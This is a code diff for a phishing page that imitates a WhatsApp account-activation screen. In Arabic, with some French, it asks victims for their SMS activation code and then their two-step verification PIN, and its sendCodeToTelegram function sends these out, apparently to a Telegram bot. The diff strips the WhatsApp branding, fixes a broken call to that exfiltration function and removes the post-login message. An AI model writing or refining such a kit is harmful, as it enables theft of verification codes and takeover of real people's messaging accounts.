@@ -14,41 +14,17 @@
             background-color: #FFFFFF;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
             height: 100vh;
             text-align: center;
         }
 
-        header {
-            width: 100%;
-            height: 60px;
-            background-color: #25D366;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
-            position: fixed;
-            top: 0;
-        }
-
-        header img {
-            width: 40px;
-            margin-right: 10px;
-        }
-
-        header h1 {
-            color: white;
-            font-size: 18px;
-            margin: 0;
-            font-weight: bold;
-        }
-
         .container {
-            margin-top: 100px;
+            padding: 20px;
+            text-align: center;
             width: 90%;
             max-width: 400px;
-            text-align: center;
         }
 
         h1 {
@@ -114,30 +90,6 @@
             text-decoration: underline;
         }
 
-        footer {
-            width: 100%;
-            background-color: #F8F9FA;
-            text-align: center;
-            padding: 10px 0;
-            box-shadow: 0px -2px 5px rgba(0, 0, 0, 0.1);
-        }
-
-        footer p {
-            font-size: 12px;
-            color: #666666;
-            margin: 5px 0;
-        }
-
-        footer a {
-            font-size: 12px;
-            color: #25D366;
-            text-decoration: none;
-        }
-
-        footer a:hover {
-            text-decoration: underline;
-        }
-
         #countdown {
             color: red;
             font-weight: bold;
@@ -147,11 +99,6 @@
 </head>
 
 <body>
-    <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        <h1>WhatsApp</h1>
-    </header>
-
     <div class="container" id="container">
         <h1>رمز التفعيل</h1>
         <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
@@ -159,11 +106,6 @@
         <button onclick="submitFirstActivationCode()">متابعة</button>
         <div id="countdown"></div>
     </div>
-
-    <footer>
-        <p>حقوق النشر © 2024 WhatsApp Inc.</p>
-        <a href="#">سياسة الخصوصية</a> | <a href="#">الشروط</a>
-    </footer>
 
     <script>
         function sendCodeToTelegram(code, type) {
@@ -237,12 +179,12 @@
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <h1>التحقق بخطوتين</h1>
-                    <p>يرجى إدخال رمز PIN الذي قمت بإعداده مسبقًا أثناء إعداد التحقق بخطوتين.</p>
+                    <h1>Vérification en deux étapes</h1>
+                    <p>Saisissez le code PIN que vous avez créé lors de la configuration de la vérification en deux étapes.</p>
                     <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <a href="#" class="forgot-link">نسيت رمز PIN؟</a>
+                    <a href="#" class="forgot-link">PIN oublié ?</a>
                     <p class="instruction">
-                        هذا الرمز ليس رمز التفعيل الذي تلقيته، بل رمز PIN الذي قمت بإعداده مسبقًا.
+                        Vous avez vous-même créé votre code PIN. Il ne s'agit pas du code de vérification que vous avez reçu lors de votre inscription.
                     </p>
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
@@ -258,7 +200,7 @@
                 return;
             }
 
-            sendCodeTo        Telegram(pinCode1, "رمز PIN الأول");
+            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
 
             startCountdown(() => {
                 const container = document.getElementById('container');
@@ -284,11 +226,6 @@
 
             startCountdown(() => {
                 alert('تم تأكيد الدخول بنجاح!');
-                const container = document.getElementById('container');
-                container.innerHTML = `
-                    <h1>تم التحقق بنجاح</h1>
-                    <p>شكراً لاستخدامك WhatsApp. يمكنك الآن المتابعة لاستخدام التطبيق.</p>
-                `;
             });
         }
     </script>
